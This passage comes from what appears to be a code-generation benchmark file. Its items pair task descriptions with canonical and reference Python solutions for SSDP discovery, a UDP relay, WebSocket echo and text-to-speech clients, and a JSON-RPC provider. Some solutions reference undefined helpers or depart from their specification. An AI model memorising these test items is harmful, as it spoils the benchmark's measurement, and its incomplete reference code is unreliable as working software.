to send an M-SEARCH request using the provided socket.",
    "Canonical_solution": "import socket\nimport threading\nimport logging\nimport chardet\nimport traceback\nimport pulseaudio_dlna.utils.network\nimport pulseaudio_dlna.plugins.dlna.ssdp\n\nlogger = logging.getLogger('pulseaudio_dlna.discover')\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = '239.255.255.250'\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 10\n    SSDP_AMOUNT = 5\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = '\\r\\n'.join([\n        'M-SEARCH * HTTP/1.1',\n        'HOST: {host}:{port}',\n        'MAN: \"ssdp:discover\"',\n        'MX: {mx}',\n        'ST: ssdp:all',\n    ]) + '\\r\\n' * 2\n    BUFFER_SIZE = 1024\n    USE_SINGLE_SOCKET = True\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = pulseaudio_dlna.utils.network.ipv4_addresses()\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            self._search(self.host or '', ssdp_ttl, ssdp_mx, ssdp_amount)\n        else:\n            if self.host:\n                self._search(self.host, ssdp_ttl, ssdp_mx, ssdp_amount)\n            else:\n                threads = []\n                for addr in self.addresses:\n                    thread = threading.Thread(\n                        target=self._search,\n                        args=[addr, ssdp_ttl, ssdp_mx, ssdp_amount])\n                    threads.append(thread)\n                try:\n                    for thread in threads:\n                        thread.start()\n                    for thread in threads:\n                        thread.join()\n                except:\n                    traceback.print_exc()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        sock.settimeout(ssdp_mx)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n        sock.bind((host, self.MSEARCH_PORT))\n\n        for i in range(1, ssdp_amount + 1):\n            t = threading.Timer(\n                float(i) / 2, self._send_discover, args=[sock, ssdp_mx])\n            t.start()\n\n        while True:\n            try:\n                header, address = sock.recvfrom(self.BUFFER_SIZE)\n                if self.cb_on_device_response:\n                    guess = chardet.detect(header)\n                    header = header.decode(guess['encoding'])\n                    header = pulseaudio_dlna.plugins.dlna.ssdp._get_header_map(header)\n                    self.cb_on_device_response(header, address)\n            except socket.timeout:\n                break\n        sock.close()\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(\n            host=self.SSDP_ADDRESS, port=self.SSDP_PORT, mx=ssdp_mx)\n        if self.USE_SINGLE_SOCKET:\n            for addr in self.addresses:\n                sock.setsockopt(\n                    socket.SOL_IP, socket.IP_MULTICAST_IF,\n                    socket.inet_aton(addr))\n                sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))\n        else:\n            sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport struct\nimport threading\nimport time\nfrom typing import List, Optional, Callable\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = '239.255.255.250'\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 2\n    SSDP_AMOUNT = 3\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = \\\n        'M-SEARCH * HTTP/1.1\\r\\n' \\\n        'HOST: {ssdp_address}:{ssdp_port}\\r\\n' \\\n        'MAN: \"ssdp:discover\"\\r\\n' \\\n        'MX: {ssdp_mx}\\r\\n' \\\n        'MITV-DEVICE: TV\\r\\n' \\\n        'NT: upnp:rootdevice\\r\\n' \\\n        'USER-AGENT: MITV_CONTROL_CLIENT/1.0\\r\\n' \\\n        '\\r\\n'\n    BUFFER_SIZE = 65507\n    USE_SINGLE_SOCKET = False\n\n    def __init__(self, cb_on_device_response: Callable[[str], None], host: Optional[str] = None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self) -> None:\n        # This is a simplified approach; for full functionality, you'd need to gather all local IPv4 addresses\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n                s.connect(('8.8.8.8', 80))\n                ip = s.getsockname()[0]\n                self.addresses = [ip]\n        except Exception:\n            self.addresses = ['0.0.0.0']\n\n    def search(self, ssdp_ttl: int = None, ssdp_mx: int = None, ssdp_amount: int = None) -> None:\n        if self.USE_SINGLE_SOCKET:\n            host = self.host if self.host else '0.0.0.0'\n            self._search(host, ssdp_ttl or self.SSDP_TTL, ssdp_mx or self.SSDP_MX, ssdp_amount or self.SSDP_AMOUNT)\n        else:\n            threads = []\n            for addr in self.addresses:\n                thread = threading.Thread(\n                    target=self._search,\n                    args=(addr, ssdp_ttl or self.SSDP_TTL, ssdp_mx or self.SSDP_MX, ssdp_amount or self.SSDP_AMOUNT),\n                    daemon=True\n                )\n                threads.append(thread)\n                thread.start()\n            \n            for thread in threads:\n                thread.join()\n\n    def _search(self, host: str, ssdp_ttl: int, ssdp_mx: int, ssdp_amount: int) -> None:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n            sock.settimeout(5)\n            sock.bind((host, self.MSEARCH_PORT))\n\n            ttl = struct.pack('B', ssdp_ttl)\n            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)\n\n            for _ in range(ssdp_amount):\n                self._send_discover(sock, ssdp_mx)\n                \n            while True:\n                try:\n                    data, addr = sock.recvfrom(self.BUFFER_SIZE)\n                    self.cb_on_device_response(data.decode('utf-8'))\n                except socket.timeout:\n                    break\n        finally:\n            sock.close()\n\n    def _send_discover(self, sock: socket.socket, ssdp_mx: int) -> None:\n        msg = self.MSEARCH_MSG.format(\n            ssdp_address=self.SSDP_ADDRESS,\n            ssdp_port=self.SSDP_PORT,\n            ssdp_mx=ssdp_mx\n        )\n        try:\n            sock.sendto(msg.encode('utf-8'), (self.SSDP_ADDRESS, self.SSDP_PORT))\n        except socket.error:\n            pass  # Ignore send errors\n\n# Example usage:\n# def handle_response(data):\n#     print(\"Received response:\", data)\n#\n# discoverer = SSDPDiscover(handle_response)\n# discoverer.search()"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a UDP relay class that facilitates communication between local and remote servers using UDP sockets, handling DNS resolution and data forwarding.\n\nClass Description: The UDPRelay class manages UDP socket communication, including socket creation, binding, data transmission, and DNS resolution. It acts as a relay between local and remote endpoints, handling both incoming and outgoing UDP packets.\n\nAttributes:\n- _config: [dict] - Configuration parameters including addresses and ports\n- _dns_resolver: [object] - DNS resolver for handling domain name resolution\n- _is_local: [bool] - Flag indicating if the instance is local or remote\n- _sockets: [set] - Set of active client sockets\n- _server_socket: [socket.socket] - Main server socket for listening\n- _closed: [bool] - Flag indicating if the relay is closed\n- _listen_addr: [str] - Address to listen on\n- _listen_port: [int] - Port to listen on\n\nMethods:\n- __init__(config: dict, dns_resolver: object, is_local: bool) -> None - Initializes the UDP relay with configuration, DNS resolver, and local/remote mode\n- _handle_server() -> None - Handles incoming data from the server socket\n- _handle_server_dns_resolved(error: str, remote_addr: tuple, server_addr: str, params: tuple) -> None - Handles DNS resolution results and forwards data\n- _handle_client(sock: socket.socket) -> None - Handles incoming data from client sockets\n- close() -> None - Closes all sockets and cleans up resources",
    "Canonical_solution": "import socket\nimport errno\nimport logging\nfrom typing import Tuple, Optional\n\nclass UDPRelay:\n    def __init__(self, config, dns_resolver, is_local):\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._sockets = set()\n        self._server_socket = None\n        self._closed = False\n\n        if is_local:\n            self._listen_addr = config['local_address']\n            self._listen_port = config['local_port']\n        else:\n            self._listen_addr = config['server']\n            self._listen_port = config['server_port']\n\n        addrs = socket.getaddrinfo(self._listen_addr, self._listen_port, 0,\n                                 socket.SOCK_DGRAM, socket.SOL_UDP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        self._server_socket = socket.socket(af, socktype, proto)\n        self._server_socket.bind((self._listen_addr, self._listen_port))\n        self._server_socket.setblocking(False)\n\n    def _handle_server(self):\n        data, r_addr = self._server_socket.recvfrom(65536)\n        if not data:\n            logging.debug('UDP handle_server: data is empty')\n            return\n\n        try:\n            header_result = parse_header(data)\n            if header_result is None:\n                return\n            connecttype, addrtype, dest_addr, dest_port, header_length = header_result\n\n            if self._is_local:\n                server_addr, server_port = self._get_a_server()\n            else:\n                server_addr, server_port = dest_addr, dest_port\n\n            if (addrtype & 7) == 3:\n                af = common.is_ip(server_addr)\n                if not af:\n                    handler = common.UDPAsyncDNSHandler((data, r_addr, None, header_length))\n                    handler.resolve(self._dns_resolver, (server_addr, server_port), \n                                   self._handle_server_dns_resolved)\n                else:\n                    self._handle_server_dns_resolved(\"\", (server_addr, server_port), \n                                                   server_addr, (data, r_addr, None, header_length))\n            else:\n                self._handle_server_dns_resolved(\"\", (server_addr, server_port), \n                                               server_addr, (data, r_addr, None, header_length))\n        except Exception as e:\n            logging.error(f\"Error handling server data: {e}\")\n\n    def _handle_server_dns_resolved(self, error, remote_addr, server_addr, params):\n        if error:\n            return\n        data, r_addr, uid, header_length = params\n        server_port = remote_addr[1]\n\n        addrs = socket.getaddrinfo(server_addr, server_port, 0,\n                                 socket.SOCK_DGRAM, socket.SOL_UDP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        client = socket.socket(af, socktype, proto)\n        client.setblocking(False)\n\n        try:\n            client.sendto(data[header_length:], (server_addr, server_port))\n            self._sockets.add(client.fileno())\n        except IOError as e:\n            err = eventloop.errno_from_exception(e)\n            if err not in (errno.EINPROGRESS, errno.EAGAIN):\n                logging.error(f\"Error sending UDP data: {e}\")\n\n    def _handle_client(self, sock):\n        data, r_addr = sock.recvfrom(65536)\n        if not data:\n            return\n\n        if not self._is_local:\n            data = pack_addr(r_addr[0]) + struct.pack('>H', r_addr[1]) + data\n\n        try:\n            self._server_socket.sendto(data, r_addr)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EWOULDBLOCK,):\n                logging.error(f\"Error sending UDP response: {e}\")\n\n    def close(self):\n        self._closed = True\n        if self._server_socket:\n            self._server_socket.close()\n        for sock in self._sockets:\n            try:\n                sock.close()\n            except:\n                pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport threading\n\n\nclass UDPRelay:\n    def __init__(self, config: dict, dns_resolver: object, is_local: bool) -> None:\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._sockets = set()\n        self._server_socket = None\n        self._closed = False\n        self._listen_addr = config.get(\"listen_addr\", \"0.0.0.0\")\n        self._listen_port = config.get(\"listen_port\", 53)\n        self._remote_addr = config.get(\"remote_addr\", \"8.8.8.8\")\n        self._remote_port = config.get(\"remote_port\", 53)\n\n        try:\n            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            self._server_socket.bind((self._listen_addr, self._listen_port))\n            server_thread = threading.Thread(target=self._handle_server)\n            server_thread.daemon = True\n            server_thread.start()\n\n            client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            self._sockets.add(client_socket)\n            client_thread = threading.Thread(target=self._handle_client, args=(client_socket,))\n            client_thread.daemon = True\n            client_thread.start()\n\n        except Exception as e:\n            self.close()\n            raise\n\n    def _handle_server(self) -> None:\n        while not self._closed and self._server_socket:\n            try:\n                data, addr = self._server_socket.recvfrom(65535)\n                if self._is_local:\n                    self._dns_resolver.resolve(\n                        self._remote_addr,\n                        callback=self._handle_server_dns_resolved,\n                        user_data=(data, addr),\n                    )\n                else:\n                    for sock in self._sockets:\n                        sock.sendto(data, addr)\n            except Exception as e:\n                pass\n\n    def _handle_server_dns_resolved(self, error: str, remote_addr: tuple, server_addr: str, params: tuple) -> None:\n        if error or not remote_addr:\n            return\n        data, client_addr = params\n        if self._server_socket:\n            self._server_socket.sendto(data, remote_addr)\n\n    def _handle_client(self, sock: socket.socket) -> None:\n        while not self._closed and sock:\n            try:\n                data, addr = sock.recvfrom(65535)\n                if self._is_local:\n                    if self._server_socket:\n                        self._server_socket.sendto(data, addr)\n                else:\n                    for s in self._sockets:\n                        if s != sock:\n                            s.sendto(data, addr)\n            except Exception as e:\n                pass\n\n    def close(self) -> None:\n        self._closed = True\n        if self._server_socket:\n            self._server_socket.close()\n            self._server_socket = None\n        for sock in self._sockets:\n            sock.close()\n        self._sockets.clear()"
  },
  {
    "Task_id": 436,
    "Instruction": "Task Description: Create a WebSocket client using Python's asyncio and aiohttp libraries to establish a connection, send messages, receive responses, and gracefully close the connection.\n\nFunction Description: The code demonstrates how to implement a WebSocket client that connects to a server, sends an initial message (\"hello world!\"), echoes received messages, and closes the connection when instructed.\n\nInput:\n- URL (implicit): The WebSocket server URL to connect to\n- sslctx (implicit): Boolean flag indicating whether to use SSL (defaults to False)\n\nOutput:\n- None (direct output): The function prints received messages to stdout\n- Side effect: Maintains WebSocket connection and handles message exchange\n\nMethods:\n1. ws_test_echo(session) -> None\n   - Takes an aiohttp.ClientSession object\n   - Handles WebSocket communication lifecycle\n   - Sends initial message and echoes responses\n   - Closes connection when receiving \"close\" command\n\n2. main() -> None\n   - Creates ClientSession and runs ws_test_echo\n   - Serves as entry point for the async operations\n\nExecution:\n- The script uses asyncio.run() to start the async event loop\n- All WebSocket operations are performed asynchronously",
    "Canonical_solution": "import sys\nimport aiohttp\nimport asyncio\n\nsslctx = False\n\nasync def ws_test_echo(session):\n    async with session.ws_connect(URL, ssl=sslctx) as ws:\n        await ws.send_str(\"hello world!\\r\\n\")\n        async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                print(msg.data)\n\n            if \"close\" in msg.data:\n                break\n            await ws.send_str(\"close\\r\\n\")\n        await ws.close()\n\nasync def main():\n    async with aiohttp.ClientSession() as session:\n        await ws_test_echo(session)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())",
    "Code_level": "Function-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nfrom aiohttp import ClientSession, WSMsgType\n\nasync def ws_test_echo(session):\n    url = \"ws://example.com/websocket\"\n    sslctx = False\n    async with session.ws_connect(url, ssl=sslctx) as ws:\n        await ws.send_str(\"hello world!\")\n        async for msg in ws:\n            if msg.type == WSMsgType.TEXT:\n                print(msg.data)\n                if msg.data.strip().lower() == \"close\":\n                    await ws.close()\n                    break\n                else:\n                    await ws.send_str(f\"echo: {msg.data}\")\n            elif msg.type in (WSMsgType.CLOSED, WSMsgType.ERROR):\n                break\n\nasync def main():\n    async with ClientSession() as session:\n        await ws_test_echo(session)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())"
  },
  {
    "Task_id": 437,
    "Instruction": "Task Description: Implement a WebSocket client for text-to-speech (TTS) communication that handles asynchronous streaming of audio and metadata, with support for DRM and error handling.\n\nClass Description: The `Communicate` class manages WebSocket connections to a TTS service, sending text data and receiving audio streams and metadata asynchronously. It handles connection setup, message exchange, DRM challenges, and error scenarios.\n\nAttributes:\n\n- tts_config: [TTSConfig] - Configuration for TTS including voice, rate, volume, and pitch settings.\n- texts: [List[str]] - List of text chunks to be processed, split by byte length constraints.\n- proxy: [Optional[str]] - Proxy URL for the WebSocket connection if needed.\n- session_timeout: [aiohttp.ClientTimeout] - Timeout settings for the WebSocket session.\n- connector: [Optional[aiohttp.BaseConnector]] - Custom connector for the WebSocket session.\n- state: [CommunicateState] - Dictionary tracking streaming state including partial text, offsets, and stream status.\n\nMethods:\n\n- __init__(text: str, voice: str = DEFAULT_VOICE, *, rate: str = \"+0%\", volume: str = \"+0%\", pitch: str = \"+0Hz\", connector: Optional[aiohttp.BaseConnector] = None, proxy: Optional[str] = None, connect_timeout: Optional[int] = 10, receive_timeout: Optional[int] = 60) -> None - Initializes the TTS communication with text and configuration parameters.\n- __stream() -> AsyncGenerator[TTSChunk, None] - Private async generator that handles the WebSocket communication, yielding audio chunks and metadata.\n- stream() -> AsyncGenerator[TTSChunk, None] - Public async generator that manages the streaming process, handling DRM challenges and text chunk iteration.\n- stream_sync() -> Generator[TTSChunk, None, None] - Synchronous wrapper for the async stream method, using a ThreadPoolExecutor to bridge async/sync contexts.",
    "Canonical_solution": "import asyncio\nimport concurrent.futures\nimport json\nimport ssl\nimport time\nimport uuid\nfrom queue import Queue\nfrom typing import AsyncGenerator, Generator, Optional, Union\n\nimport aiohttp\nimport certifi\n\nfrom .constants import DEFAULT_VOICE, SEC_MS_GEC_VERSION, WSS_HEADERS, WSS_URL\nfrom .data_classes import TTSConfig\nfrom .drm import DRM\nfrom .exceptions import (\n    NoAudioReceived,\n    UnexpectedResponse,\n    UnknownResponse,\n    WebSocketError,\n)\nfrom .typing import CommunicateState, TTSChunk\n\nclass Communicate:\n    def __init__(\n        self,\n        text: str,\n        voice: str = DEFAULT_VOICE,\n        *,\n        rate: str = \"+0%\",\n        volume: str = \"+0%\",\n        pitch: str = \"+0Hz\",\n        connector: Optional[aiohttp.BaseConnector] = None,\n        proxy: Optional[str] = None,\n        connect_timeout: Optional[int] = 10,\n        receive_timeout: Optional[int] = 60,\n    ):\n        self.tts_config = TTSConfig(voice, rate, volume, pitch)\n        self.texts = split_text_by_byte_length(\n            escape(remove_incompatible_characters(text)),\n            calc_max_mesg_size(self.tts_config),\n        )\n        self.proxy = proxy\n        self.session_timeout = aiohttp.ClientTimeout(\n            total=None,\n            connect=None,\n            sock_connect=connect_timeout,\n            sock_read=receive_timeout,\n        )\n        self.connector = connector\n        self.state: CommunicateState = {\n            \"partial_text\": b\"\",\n            \"offset_compensation\": 0,\n            \"last_duration_offset\": 0,\n            \"stream_was_called\": False,\n        }\n\n    async def __stream(self) -> AsyncGenerator[TTSChunk, None]:\n        audio_was_received = False\n        ssl_ctx = ssl.create_default_context(cafile=certifi.where())\n        \n        async with aiohttp.ClientSession(\n            connector=self.connector,\n            trust_env=True,\n            timeout=self.session_timeout,\n        ) as session, session.ws_connect(\n            f\"{WSS_URL}&Sec-MS-GEC={DRM.generate_sec_ms_gec()}\"\n            f\"&Sec-MS-GEC-Version={SEC_MS_GEC_VERSION}\"\n            f\"&ConnectionId={connect_id()}\",\n            compress=15,\n            proxy=self.proxy,\n            headers=WSS_HEADERS,\n            ssl=ssl_ctx,\n        ) as websocket:\n            await websocket.send_str(\n                f\"X-Timestamp:{date_to_string()}\\r\\n\"\n                \"Content-Type:application/json; charset=utf-8\\r\\n\"\n                \"Path:speech.config\\r\\n\\r\\n\"\n                '{\"context\":{\"synthesis\":{\"audio\":{\"metadataoptions\":{'\n                '\"sentenceBoundaryEnabled\":\"false\",\"wordBoundaryEnabled\":\"true\"},'\n                '\"outputFormat\":\"audio-24khz-48kbitrate-mono-mp3\"'\n                \"}}}}\\r\\n\"\n            )\n\n            await websocket.send_str(\n                ssml_headers_plus_data(\n                    connect_id(),\n                    date_to_string(),\n                    mkssml(\n                        self.tts_config,\n                        self.state[\"partial_text\"],\n                    ),\n                )\n            )\n\n            async for received in websocket:\n                if received.type == aiohttp.WSMsgType.TEXT:\n                    encoded_data = received.data.encode(\"utf-8\")\n                    parameters, data = get_headers_and_data(\n                        encoded_data, encoded_data.find(b\"\\r\\n\\r\\n\")\n                    )\n                    path = parameters.get(b\"Path\", None)\n                    if path == b\"audio.metadata\":\n                        parsed_metadata = self.__parse_metadata(data)\n                        yield parsed_metadata\n                        self.state[\"last_duration_offset\"] = (\n                            parsed_metadata[\"offset\"] + parsed_metadata[\"duration\"]\n                        )\n                    elif path == b\"turn.end\":\n                        self.state[\"offset_compensation\"] = self.state[\n                            \"last_duration_offset\"\n                        ]\n                        self.state[\"offset_compensation\"] += 8_750_000\n                        break\n                elif received.type == aiohttp.WSMsgType.BINARY:\n                    header_length = int.from_bytes(received.data[:2], \"big\")\n                    parameters, data = get_headers_and_data(\n                        received.data, header_length\n                    )\n                    if parameters.get(b\"Path\") == b\"audio\":\n                        audio_was_received = True\n                        yield {\"type\": \"audio\", \"data\": data}\n                elif received.type == aiohttp.WSMsgType.ERROR:\n                    raise WebSocketError(received.data if received.data else \"Unknown error\")\n\n            if not audio_was_received:\n                raise NoAudioReceived(\"No audio was received.\")\n\n    async def stream(self) -> AsyncGenerator[TTSChunk, None]:\n        if self.state[\"stream_was_called\"]:\n            raise RuntimeError(\"stream can only be called once.\")\n        self.state[\"stream_was_called\"] = True\n\n        for self.state[\"partial_text\"] in self.texts:\n            try:\n                async for message in self.__stream():\n                    yield message\n            except aiohttp.ClientResponseError as e:\n                if e.status != 403:\n                    raise\n                DRM.handle_client_response_error(e)\n                async for message in self.__stream():\n                    yield message\n\n    def stream_sync(self) -> Generator[TTSChunk, None, None]:\n        def fetch_async_items(queue: Queue) -> None:\n            async def get_items() -> None:\n                async for item in self.stream():\n                    queue.put(item)\n                queue.put(None)\n\n            loop = asyncio.new_event_loop()\n            asyncio.set_event_loop(loop)\n            loop.run_until_complete(get_items())\n            loop.close()\n\n        queue: Queue = Queue()\n        with concurrent.futures.ThreadPoolExecutor() as executor:\n            executor.submit(fetch_async_items, queue)\n            while True:\n                item = queue.get()\n                if item is None:\n                    break\n                yield item",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nimport json\nimport logging\nimport re\nfrom dataclasses import dataclass\nfrom typing import Optional, List, AsyncGenerator, Generator, Any, Dict\nimport aiohttp\nfrom threading import Thread, current_thread\nfrom queue import Queue\n\nlogger = logging.getLogger(__name__)\n\nDEFAULT_VOICE = \"en-US-JennyNeural\"\n\n@dataclass\nclass TTSConfig:\n    voice: str\n    rate: str = \"+0%\"\n    volume: str = \"+0%\"\n    pitch: str = \"+0Hz\"\n\n@dataclass\nclass TTSChunk:\n    audio: bytes\n    offset: int\n    duration_ms: int\n    text: str\n\nclass CommunicateState:\n    def __init__(self):\n        self.partial_text: str = \"\"\n        self.offset: int = 0\n        self.stream_started: bool = False\n        self.last_audio_time: float = 0.0\n        self.total_duration: int = 0\n\nclass Communicate:\n    WS_URL = \"wss://tts.example.com/ws\"\n    \n    def __init__(self, text: str, voice: str = DEFAULT_VOICE, *, \n                 rate: str = \"+0%\", volume: str = \"+0%\", pitch: str = \"+0Hz\",\n                 connector: Optional[aiohttp.BaseConnector] = None,\n                 proxy: Optional[str] = None,\n                 connect_timeout: Optional[int] = 10,\n                 receive_timeout: Optional[int] = 60) -> None:\n        self.tts_config = TTSConfig(voice, rate, volume, pitch)\n        self.texts = self._split_text_by_bytes(text, 512)\n        self.proxy = proxy\n        self.session_timeout = aiohttp.ClientTimeout(total=connect_timeout)\n        self.connector = connector\n        self.state = CommunicateState()\n        \n    def _split_text_by_bytes(self, text: str, max_bytes: int) -> List[str]:\n        words = text.split()\n        chunks = []\n        current_chunk = \"\"\n        \n        for word in words:\n            test_chunk = f\"{current_chunk} {word}\".strip()\n            if len(test_chunk.encode('utf-8')) <= max_bytes:\n                current_chunk = test_chunk\n            else:\n                chunks.append(current_chunk)\n                current_chunk = word\n        if current_chunk:\n            chunks.append(current_chunk)\n        return chunks\n        \n    async def __stream(self) -> AsyncGenerator[TTSChunk, None]:\n        headers = {\"Authorization\": \"Bearer your_token_here\"}\n        \n        async with aiohttp.ClientSession(timeout=self.session_timeout, connector=self.connector) as session:\n            try:\n                async with session.ws_connect(\n                    self.WS_URL,\n                    headers=headers,\n                    proxy=self.proxy,\n                    timeout=10\n                ) as ws:\n                    # Send configuration\n                    await ws.send_str(json.dumps({\n                        \"type\": \"config\",\n                        \"voice\": self.tts_config.voice,\n                        \"rate\": self.tts_config.rate,\n                        \"volume\": self.tts_config.volume,\n                        \"pitch\": self.tts_config.pitch\n                    }))\n                    \n                    # Process each text chunk\n                    for i, text_chunk in enumerate(self.texts):\n                        logger.debug(f\"Sending text chunk {i+1}/{len(self.texts)}\")\n                        \n                        # Send text message\n                        await ws.send_str(json.dumps({\n                            \"type\": \"text\",\n                            \"text\": text_chunk,\n                            \"offset\": self.state.offset,\n                            \"chunk_index\": i\n                        }))\n                        \n                        # Wait for confirmation\n                        ack = await ws.receive_json()\n                        if ack.get(\"status\") != \"received\":\n                            raise RuntimeError(f\"Text chunk not received: {ack}\")\n                    \n                    # Send end of stream marker\n                    await ws.send_str(json.dumps({\"type\": \"eos\"}))\n                    \n                    # Process incoming messages\n                    while True:\n                        msg = await ws.receive()\n                        \n                        if msg.type == aiohttp.WSMsgType.TEXT:\n                            data = json.loads(msg.data)\n                            \n                            if data[\"type\"] == \"audio\":\n                                yield TTSChunk(\n                                    audio=bytes.fromhex(data[\"audio\"]),\n                                    offset=data[\"offset\"],\n                                    duration_ms=data[\"duration_ms\"],\n                                    text=data[\"text\"]\n                                )\n                                \n                                self.state.offset = data[\"offset\"] + data[\"duration_ms\"]\n                                self.state.total_duration += data[\"duration_ms\"]\n                                \n                            elif data[\"type\"] == \"drm_challenge\":\n                                logger.warning(\"DRM challenge required\")\n                                response = await self.handle_drm_challenge(data)\n                                await ws.send_str(json.dumps(response))\n                                \n                            elif data[\"type\"] == \"error\":\n                                logger.error(f\"WebSocket error: {data['message']}\")\n                                raise RuntimeError(data[\"message\"])\n                                \n                            elif data[\"type\"] == \"end\":\n                                logger.info(\"Stream completed\")\n                                break\n                                \n                        elif msg.type == aiohttp.WSMsgType.ERROR:\n                            logger.error(f\"WebSocket connection error: {ws.exception()}\")\n                            raise ws.exception()\n                            \n                        elif msg.type == aiohttp.WSMsgType.CLOSED:\n                            logger.warning(\"WebSocket connection closed\")\n                            break\n                            \n            except aiohttp.ClientError as e:\n                logger.error(f\"Connection failed: {str(e)}\")\n                raise\n            \n    async def handle_drm_challenge(self, challenge_data: dict) -> dict:\n        \"\"\"Handle DRM challenge from the server\"\"\"\n        logger.info(\"Handling DRM challenge\")\n        # Simulate license acquisition\n        license_key = await self.acquire_license()\n        \n        return {\n            \"type\": \"drm_response\",\n            \"license_key\": license_key,\n            \"challenge_id\": challenge_data[\"challenge_id\"]\n        }\n        \n    async def acquire_license(self) -> str:\n        \"\"\"Simulate license acquisition process\"\"\"\n        # In a real implementation, this would make an API call to get a license\n        await asyncio.sleep(0.1)\n        return \"fake-license-key-12345\"\n        \n    async def stream(self) -> AsyncGenerator[TTSChunk, None]:\n        \"\"\"Public streaming method that handles DRM and text chunking\"\"\"\n        retry_count = 0\n        max_retries = 3\n        \n        while retry_count <= max_retries:\n            try:\n                async for chunk in self.__stream():\n                    yield chunk\n                break  # Success - exit loop\n                \n            except Exception as e:\n                if \"DRM\" in str(e) and retry_count < max_retries:\n                    logger.warning(f\"DRM error occurred, retrying... ({retry_count+1}/{max_retries})\")\n                    retry_count += 1\n                    continue\n                logger.error(f\"Streaming failed: {str(e)}\")\n                raise\n        \n    def stream_sync(self) -> Generator[TTSChunk, None, None]:\n        \"\"\"Synchronous wrapper for async stream method\"\"\"\n        q = Queue()\n        stop = object()\n        \n        def run_async():\n            loop = asyncio.new_event_loop()\n            \n            try:\n                async def generator_wrapper():\n                    async for item in self.stream():\n                        loop.call_soon_threadsafe(q.put, (item,))\n                    loop.call_soon_threadsafe(q.put, (stop,))\n                \n                loop.run_until_complete(generator_wrapper())\n            except Exception as e:\n                loop.call_soon_threadsafe(q.put, (e,))\n                loop.call_soon_threadsafe(q.put, (stop,))\n            finally:\n                loop.close()\n        \n        thread = Thread(target=run_async)\n        thread.daemon = True\n        thread.start()\n        \n        while True:\n            item = q.get()\n            if isinstance(item, Exception):\n                raise item\n            if item is stop:\n                break\n            yield item"
  },
  {
    "Task_id": 438,
    "Instruction": "Task Description: Implement a WebSocket client class in Python using asyncio and websockets libraries to handle persistent WebSocket connections, send/receive messages, and manage connection lifecycle.\n\nClass Description: The PersistentWebSocket class manages a persistent WebSocket connection with automatic reconnection handling and proper resource cleanup. It's designed to be used as an asynchronous context manager.\n\nAttributes:\n- ws: Optional[WebSocketClientProtocol] - The active WebSocket connection object\n- endpoint_uri: str - The WebSocket server URI to connect to\n- websocket_kwargs: Any - Additional keyword arguments for the WebSocket connection\n\nMethods:\n- __aenter__() -> WebSocketClientProtocol - Asynchronously establishes a connection if none exists and returns the WebSocket client protocol\n- __aexit__(exc_type: type, exc_val: BaseException, exc_tb: Any) -> None - Handles connection cleanup on context exit, closing the connection if an exception occurred\n\nClass Description: The LegacyWebSocketProvider class extends JSONBaseProvider to provide WebSocket-based JSON-RPC functionality with timeout support and batch request handling.\n\nAttributes:\n- _loop: ClassVar[Any] - The asyncio event loop used for running coroutines\n- endpoint_uri: Optional[Union[str, URI]] - The WebSocket server endpoint URI\n- websocket_timeout: int - Timeout value for WebSocket operations\n- conn: PersistentWebSocket - The persistent WebSocket connection instance\n\nMethods:\n- coro_make_request(request_data: bytes) -> RPCResponse - Coroutine that sends a request and waits for a response through the WebSocket connection\n- make_request(method: RPCEndpoint, params: Any) -> RPCResponse - Synchronous method to make a single RPC request\n- make_batch_request(requests: List[Tuple[RPCEndpoint, Any]]) -> List[RPCResponse] - Synchronous method to make a batch of RPC requests",
